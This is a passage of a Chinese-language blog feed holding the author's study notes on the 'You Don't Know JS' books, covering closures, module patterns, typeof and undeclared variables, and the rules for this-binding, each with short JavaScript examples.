class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wait</span>(<span class="params">message</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">setTimeout( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( message );</span><br><span class="line">&#125;, <span class="number">1000</span> );</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wait( <span class="string">"Hello, closure!"</span> );</span><br></pre></td></tr></table></figure><ul><li>我们拿来一个内部函数（名为 timer）将它传递给 setTimeout(..)。但是 timer 拥有覆盖 wait(..) 的作用域的闭包，实际上保持并使用着对变量 message 的引用。</li><li>在我们执行 wait(..) 一千毫秒之后，要不是内部函数 timer 依然拥有覆盖着 wait() 内部作用域的闭包，它早就会消失了。</li><li>在 引擎 的内脏深处，内建的工具 setTimeout(..) 拥有一些参数的引用，可能称为 fn 或者 func 或者其他诸如此类的东西。引擎 去调用这个函数，它调用我们的内部 timer 函数，而词法作用域依然完好无损。</li></ul><h4 id="循环-闭包"><a href="#循环-闭包" class="headerlink" title="循环 + 闭包"></a>循环 + 闭包</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">1</span>; i&lt;=<span class="number">5</span>; i++) &#123;</span><br><span class="line">setTimeout( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( i );</span><br><span class="line">&#125;, i*<span class="number">1000</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码的精神是，我们一般将 期待 它的行为是分别打印数字“1”，“2”，……“5”，一次一个，一秒一个<br>实际上，如果你运行这段代码，你会得到“6”被打印5次，一秒一个。</p><p class="tip">我们试图 暗示 在迭代期间，循环的每次迭代都“捕捉”一份对 i 的拷贝。但是，虽然所有这5个函数在每次循环迭代中分离地定义，由于作用域的工作方式，它们 都闭包在同一个共享的全局作用域上，而它事实上只有一个 i</p><p>如何解决这个问题呢，定义一个新的作用域，在每次迭代时持有值 i 的一个拷贝</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">1</span>; i&lt;=<span class="number">5</span>; i++) &#123;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">j</span>)</span>&#123;</span><br><span class="line">setTimeout( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( j );</span><br><span class="line">&#125;, j*<span class="number">1000</span> );</span><br><span class="line">&#125;)( i );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="模块化"><a href="#模块化" class="headerlink" title="模块化"></a>模块化</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CoolModule</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> something = <span class="string">"cool"</span>;</span><br><span class="line"><span class="keyword">var</span> another = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( something );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doAnother</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( another.join( <span class="string">" ! "</span> ) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">doSomething: doSomething,</span><br><span class="line">doAnother: doAnother</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = CoolModule();</span><br><span class="line"></span><br><span class="line">foo.doSomething(); <span class="comment">// cool</span></span><br><span class="line">foo.doAnother(); <span class="comment">// 1 ! 2 ! 3</span></span><br></pre></td></tr></table></figure><p>首先，CoolModule() 只是一个函数，但它 必须被调用 才能成为一个被创建的模块实例。没有外部函数的执行，内部作用域的创建和闭包都不会发生。</p><p>第二，CoolModule() 函数返回一个对象，通过对象字面量语法 { key: value, … } 标记。这个我们返回的对象拥有指向我们内部函数的引用，但是 没有 指向我们内部数据变量的引用。我们可以将它们保持为隐藏和私有的。可以很恰当地认为这个返回值对象实质上是一个 我们模块的公有API。</p><p>这个返回值对象最终被赋值给外部变量 foo，然后我们可以在这个API上访问那些属性，比如 foo.doSomething()</p><h4 id="现代的模块"><a href="#现代的模块" class="headerlink" title="现代的模块"></a>现代的模块</h4><p class="tip">各种模块依赖加载器/消息机制实质上都是将这种模块定义包装进一个友好的API。与其检视任意一个特定的库，不如让我 （仅）为了说明的目的 展示一个 非常简单 的概念证明：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> MyModules = (<span class="function"><span class="keyword">function</span> <span class="title">Manager</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> modules = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">define</span>(<span class="params">name, deps, impl</span>) </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;deps.length; i++) &#123;</span><br><span class="line">deps[i] = modules[deps[i]];</span><br><span class="line">&#125;</span><br><span class="line">modules[name] = impl.apply( impl, deps );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> modules[name];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">define: define,</span><br><span class="line">get: get</span><br><span class="line">&#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;参考来源&quot;&gt;&lt;a href=&quot;#参考来源&quot; class=&quot;headerlink&quot; title=&quot;参考来源&quot;&gt;&lt;/a&gt;参考来源&lt;/h2&gt;&lt;p&gt;本文是you don’t know js系列的 &lt;a href=&quot;https://github.com/getify/You-Dont-Know-JS/tree/1ed-zh-CN/scope%20%26%20closures&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;作用域与闭包&lt;/a&gt; 笔记&lt;/p&gt;
&lt;h2 id=&quot;一、作用域&quot;&gt;&lt;a href=&quot;#一、作用域&quot; class=&quot;headerlink&quot; title=&quot;一、作用域&quot;&gt;&lt;/a&gt;一、作用域&lt;/h2&gt;&lt;h3 id=&quot;什么是作用域&quot;&gt;&lt;a href=&quot;#什么是作用域&quot; class=&quot;headerlink&quot; title=&quot;什么是作用域&quot;&gt;&lt;/a&gt;什么是作用域&lt;/h3&gt;&lt;p&gt;几乎所有计算机语言都提供了最基础的变量模型，变量它允许人们将值存入变量中，并且再后续从变量中取值或修改值。&lt;/p&gt;
&lt;p&gt;但是变量的存储同样会带来几个问题，我们如何存储数据到变量上，又如何查找变量的值。这样的一些列规则我们将其称之为作用域&lt;/p&gt;
&lt;p&gt;&lt;div&gt;
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>types &amp; grammar</title>
    <link href="http://zhoushaw.github.io/2019/04/01/learning/book-notes/types%20&amp;%20grammar/"/>
    <id>http://zhoushaw.github.io/2019/04/01/learning/book-notes/types &amp; grammar/</id>
    <published>2019-03-31T20:36:35.000Z</published>
    <updated>2019-04-20T12:39:57.662Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、类型"><a href="#一、类型" class="headerlink" title="一、类型"></a>一、类型</h2><blockquote><p>基本类型</p></blockquote><p>JavaScript 定义了七种内建类型：</p><p>null<br>undefined<br>boolean<br>number<br>string<br>symbol – 在 ES6 中被加入的！<br>object</p><p><strong>注意</strong>： 除了 object 所有这些类型都被称为“基本类型（primitives）”。</p><blockquote><p>类型检测</p></blockquote><p>typeof 操作符可以检测给定值的类型，而且总是返回七种字符串值中的一种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typeof undefined     === &quot;undefined&quot;; // true</span><br><span class="line">typeof true          === &quot;boolean&quot;;   // true</span><br><span class="line">typeof 42            === &quot;number&quot;;    // true</span><br><span class="line">typeof &quot;42&quot;          === &quot;string&quot;;    // true</span><br><span class="line">typeof &#123; life: 42 &#125;  === &quot;object&quot;;    // true</span><br><span class="line"></span><br><span class="line">// 在 ES6 中被加入的！</span><br><span class="line">typeof Symbol()      === &quot;symbol&quot;;    // true</span><br></pre></td></tr></table></figure><p>在上面的列表中剔除了 null。它是 特殊的 – 特殊在它与 typeof 操作符组合时是有 bug 的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typeof null === &quot;object&quot;; // true</span><br></pre></td></tr></table></figure><h3 id="undefined-vs-“undeclared”"><a href="#undefined-vs-“undeclared”" class="headerlink" title="undefined vs “undeclared”"></a>undefined vs “undeclared”</h3><p>当前 还不拥有值的变量，实际上拥有 undefined 值。对这样的变量调用 typeof 将会返回 <code>&quot;undefined&quot;</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var a;</span><br><span class="line"></span><br><span class="line">typeof a; // &quot;undefined&quot;</span><br><span class="line"></span><br><span class="line">var b = 42;</span><br><span class="line">var c;</span><br><span class="line"></span><br><span class="line">// 稍后</span><br><span class="line">b = c;</span><br><span class="line"></span><br><span class="line">typeof b; // &quot;undefined&quot;</span><br><span class="line">typeof c; // &quot;undefined&quot;</span><br></pre></td></tr></table></figure><p>大多数开发者考虑“undefined”这个词的方式会诱使他们认为它是“undeclared（未声明）”的同义词。然而在 JS 中，这两个概念十分不同。</p><p>一个“undefined”变量是在可访问的作用域中已经被声明过的，但是在 这个时刻 它里面没有任何值。相比之下，一个“undeclared”变量是在可访问的作用域中还没有被正式声明的。</p><blockquote><p>考虑这段代码：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var a;</span><br><span class="line"></span><br><span class="line">a; // undefined</span><br><span class="line">b; // ReferenceError: b is not defined</span><br></pre></td></tr></table></figure><p>在上面代码中，b未声明时进行了使用，浏览器反馈的错误是：<code>b is not defined</code>.这当然很容易而且很合理地使人将它与“b is undefined.”搞混。需要重申的是，“undefined”和“is not defined”是非常不同的东西。要是浏览器能告诉我们类似于“b is not found”或者“b is not declared”之类的东西就好了，那会减少这种困惑！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var a;</span><br><span class="line"></span><br><span class="line">typeof a; // &quot;undefined&quot;</span><br><span class="line"></span><br><span class="line">typeof b; // &quot;undefined&quot;</span><br></pre></td></tr></table></figure><p><code>type</code> 对于未undeclared的变量，返回值也是<code>undefined</code>。即使 是一个未声明变量，也不会有错误被抛出。这是 typeof 的一种特殊的安全防卫行为</p><h3 id="typeof-Undeclared"><a href="#typeof-Undeclared" class="headerlink" title="typeof Undeclared"></a>typeof Undeclared</h3><p>由于typeof安全防卫的特性，我们可以将其用来判断一个变量是否在作用域内进行了赋值操作，倘若不使用typeof，若变量不存在将会发生异常</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if (typeof sss === &quot;undefined&quot;) &#123;</span><br><span class="line">sss = function() &#123; /*..*/ &#125;;</span><br><span class="line">&#125;</span><br><span class="line">``</span><br><span class="line"></span><br><span class="line">&gt; 使用场景</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">作为一个简单的例子，想象在你的程序中有一个“调试模式”，它是通过一个称为 DEBUG 的全局变量（标志）来控制的。在实施类似于在控制台上输出一条日志消息这样的调试任务之前，你想要检查这个变量是否被声明了。一个顶层的全局 var DEBUG = true 声明只包含在一个“debug.js”文件中，这个文件仅在你开发/测试时才被加载到浏览器中，而在生产环境中则不会。</span><br><span class="line"></span><br><span class="line">然而，在你其他的程序代码中，你不得不小心你是如何检查这个全局的 DEBUG 变量的，这样你才不会抛出一个 ReferenceError。这种情况下 typeof 上的安全防卫就是我们的朋友。</span><br></pre></td></tr></table></figure><p>// 噢，这将抛出一个错误！<br>if (DEBUG) {<br>    console.log( “Debugging is starting” );<br>}</p><p>// 这是一个安全的存在性检查<br>if (typeof DEBUG !== “undefined”) {<br>    console.log( “Debugging is starting” );<br>}<br><code>`</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、类型&quot;&gt;&lt;a href=&quot;#一、类型&quot; class=&quot;headerlink&quot; title=&quot;一、类型&quot;&gt;&lt;/a&gt;一、类型&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;基本类型&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;JavaScript 定义了七种内建类型：&lt;/
      
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>this &amp; 对象原型</title>
    <link href="http://zhoushaw.github.io/2019/04/01/learning/book-notes/this&amp;%E5%AF%B9%E8%B1%A1%E5%8E%9F%E5%9E%8B/"/>
    <id>http://zhoushaw.github.io/2019/04/01/learning/book-notes/this&amp;对象原型/</id>
    <published>2019-03-31T20:36:35.000Z</published>
    <updated>2019-04-23T13:22:02.323Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、this关键词"><a href="#一、this关键词" class="headerlink" title="一、this关键词"></a>一、this关键词</h2><p class="tip">this是关键词，表示指向的索引位置</p><p>很多人对于this最终指向常见的误解是，this是编写时绑定的，通常会将其认为成一下几种情况：</p><p>1、认为this指向，foo函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line">foo();</span><br></pre></td></tr></table></figure><div><a id="more"></a></div><p>2、认为this指向，obj对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="keyword">this</span>.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">a: <span class="number">2</span>,</span><br><span class="line">foo: foo</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bar = obj.foo; <span class="comment">// 函数引用！</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="string">"oops, global"</span>; <span class="comment">// `a` 也是一个全局对象的属性</span></span><br><span class="line"></span><br><span class="line">bar(); <span class="comment">// "oops, global"</span></span><br></pre></td></tr></table></figure><h3 id="可以大致分为以下几种情况："><a href="#可以大致分为以下几种情况：" class="headerlink" title="可以大致分为以下几种情况："></a>可以大致分为以下几种情况：</h3><p>函数调用方式与内部this指针关系<br>1.直接调用:函数内部this指向全局对象window<br>2.通过对象使用点来调用:函数内部this指向调用对象<br>3.触发事件调用函数:函数内部的this指向触发事件的对象<br>4.以new的方式来调用:函数内部this指向本次函数执行时对应的一个匿名对象（以new的方式创建的函数，函数名的首字母一般以大写字母开始）<br>构造函数 ，是一种特殊的方法。主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。</p><p>5.通过call的方法来间接调用方法:函数内部this指向call方法的第一参数对象<br>有点:我们可以创建结构相同，但内容不同的对象</p><p>可参考: <a href="http://www.ruanyifeng.com/blog/2018/06/javascript-this.html" target="_blank" rel="noopener">JavaScript 的this原理</a></p><p>按照本文中的分类将其分为四大块：</p><p>默认绑定、隐含绑定、明确绑定、new 绑定</p><h3 id="仅仅是规则"><a href="#仅仅是规则" class="headerlink" title="仅仅是规则"></a>仅仅是规则</h3><p>this的最终指向可以将其分为大致四种规则</p><h4 id="默认绑定"><a href="#默认绑定" class="headerlink" title="默认绑定"></a>默认绑定</h4><p>我们要考察的第一种规则源于函数调用的最常见的情况：独立函数调用</p><p>在非<code>strict mode</code>模式下，独立函数调用默认指向全局对象window，在<code>strict mode</code>模式下默认绑定 来说全局对象是不合法，所以 <code>this</code> 将被设置为 <code>undefined</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var a = 2;</span><br><span class="line"></span><br><span class="line">foo(); // 2</span><br></pre></td></tr></table></figure><h4 id="隐含绑定"><a href="#隐含绑定" class="headerlink" title="隐含绑定"></a>隐含绑定</h4><p>另一种要考虑的规则是：调用点是否有一个环境对象（<code>context object</code>），也称为拥有者（<code>owning</code>）或容器（<code>containing</code>）对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj = &#123;</span><br><span class="line">a: 2,</span><br><span class="line">foo: foo</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.foo(); // 2</span><br></pre></td></tr></table></figure><p class="tip">无论 foo() 是否一开始就在 obj 上被声明，还是后来作为引用添加（如上面代码所示），这个 函数 都不被 obj 所真正“拥有”或“包含”.调用点 使用 obj 环境来 引用 函数，所以你 可以说 obj 对象在函数被调用的时间点上“拥有”或“包含”这个 函数引用。</p><p>只有对象属性引用链的最后一层是影响调用点的。比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj2 = &#123;</span><br><span class="line">a: 42,</span><br><span class="line">foo: foo</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var obj1 = &#123;</span><br><span class="line">a: 2,</span><br><span class="line">obj2: obj2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj1.obj2.foo(); // 42</span><br></pre></td></tr></table></figure><h5 id="隐含丢失"><a href="#隐含丢失" class="headerlink" title="隐含丢失"></a>隐含丢失</h5><p>传递一个回调函数时：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function doFoo(fn) &#123;</span><br><span class="line">// `fn` 只不过 `foo` 的另一个引用</span><br><span class="line"></span><br><span class="line">fn(); // &lt;-- 调用点!</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj = &#123;</span><br><span class="line">a: 2,</span><br><span class="line">foo: foo</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var a = &quot;oops, global&quot;; // `a` 也是一个全局对象的属性</span><br><span class="line"></span><br><span class="line">doFoo( obj.foo ); // &quot;oops, global&quot;</span><br></pre></td></tr></table></figure><p>那么如果接收你所传递回调的函数不是你的，而是语言内建的呢？没有区别，同样的结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj = &#123;</span><br><span class="line">a: 2,</span><br><span class="line">foo: foo</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var a = &quot;oops, global&quot;; // `a` 也是一个全局对象的属性</span><br><span class="line"></span><br><span class="line">setTimeout( obj.foo, 100 ); // &quot;oops, global&quot;</span><br></pre></td></tr></table></figure><p>正如我们刚刚看到的，我们的回调函数丢掉他们的 this 绑定是十分常见的事情。但是 this 使我们吃惊的另一种方式是，接收我们回调的函数故意改变调用的 this。那些很流行的 JavaScript 库中的事件处理器就十分喜欢强制你的回调的 this 指向触发事件的 DOM 元素。虽然有时这很有用，但其他时候这简直能气死人。不幸的是，这些工具很少给你选择。</p><h4 id="明确绑定"><a href="#明确绑定" class="headerlink" title="明确绑定"></a>明确绑定</h4><p>JavaScript 语言中的“所有”函数都有一些工具。具体地说，函数拥有 call(..) 和 apply(..) 方法。</p><p>这些工具如何工作？它们接收的第一个参数都是一个用于 this 的对象，之后使用这个指定的 this 来调用函数。因为你已经直接指明你想让 this 是什么，所以我们称这种方式为 明确绑定（explicit binding)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj = &#123;</span><br><span class="line">a: 2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">foo.call( obj ); // 2</span><br></pre></td></tr></table></figure><h5 id="API-调用的“环境”"><a href="#API-调用的“环境”" class="headerlink" title="API 调用的“环境”"></a>API 调用的“环境”</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function foo(el) &#123;</span><br><span class="line">console.log( el, this.id );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj = &#123;</span><br><span class="line">id: &quot;awesome&quot;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// 使用 `obj` 作为 `this` 来调用 `foo(..)`</span><br><span class="line">[1, 2, 3].forEach( foo, obj ); // 1 awesome  2 awesome  3 awesome</span><br></pre></td></tr></table></figure><h4 id="new-绑定"><a href="#new-绑定" class="headerlink" title="new 绑定"></a>new 绑定</h4><p>当使用 new 操作符来初始化一个类时，这个类的构造器就会被调用。通常看起来像这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">something = new MyClass(..);</span><br></pre></td></tr></table></figure><p class="tip">实际上 JavaScript 的机制和 new 在 JS 中的用法所暗示的面向类的功能 没有任何联系。在 JS 中，构造器 仅仅是一个函数，它们偶然地与前置的 new 操作符一起调用。它们不依附于类，它们也不初始化一个类。它们甚至不是一种特殊的函数类型。它们本质上只是一般的函数，在被使用 new 来调用时改变了行为。</p><blockquote><p>当在函数前面被加入 new 调用时，也就是构造器调用时，下面这些事情会自动完成：</p></blockquote><ul><li>一个全新的对象会凭空创建（就是被构建）</li><li>这个新构建的对象会被接入原形链（[[Prototype]]-linked）</li><li>这个新构建的对象被设置为函数调用的 this 绑定</li><li>除非函数返回一个它自己的其他 对象，否则这个被 new 调用的函数将 自动 返回这个新构建的对象。</li></ul><p>简单来说通过new方法初始化的构造器this指向函数本身</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function foo(a) &#123;</span><br><span class="line">this.a = a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var bar = new foo( 2 );</span><br><span class="line">console.log( bar.a ); // 2</span><br></pre></td></tr></table></figure><h3 id="一切皆有顺序"><a href="#一切皆有顺序" class="headerlink" title="一切皆有顺序"></a>一切皆有顺序</h3><p class="tip">上面已经揭示了四种this绑定最终指向的规则，但是指向的规则可能会出现重叠的情况，当两种以上的规则出现后如何抉择优先顺序呢。</p><ul><li>函数是通过 new 被调用的吗（new 绑定）？如果是，this 就是新构建的对象。<ul><li>var bar = new foo()</li></ul></li><li>函数是通过 call 或 apply 被调用（明确绑定），甚至是隐藏在 bind 硬绑定 之中吗？如果是，this 就是那个被明确指定的对象。<ul><li>var bar = foo.call( obj2 )</li></ul></li><li>函数是通过环境对象（也称为拥有者或容器对象）被调用的吗（隐含绑定）？如果是，this 就是那个环境对象。<ul><li>var bar = obj1.foo()</li></ul></li><li>否则，使用默认的 this（默认绑定）。如果在 strict mode 下，就是 undefined，否则是 global 对象。<ul><li>var bar = foo()</li></ul></li></ul><h3 id="绑定的特例"><a href="#绑定的特例" class="headerlink" title="绑定的特例"></a>绑定的特例</h3><p>正如通常的那样，对于“规则”总有一些 例外。</p><h4 id="被忽略的-this"><a href="#被忽略的-this" class="headerlink" title="被忽略的 this"></a>被忽略的 this</h4><p class="tip">如果你传递 null 或 undefined 作为 call、apply 或 bind 的 this 绑定参数，那么这些值会被忽略掉，取而代之的是 默认绑定 规则将适用于这个调用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 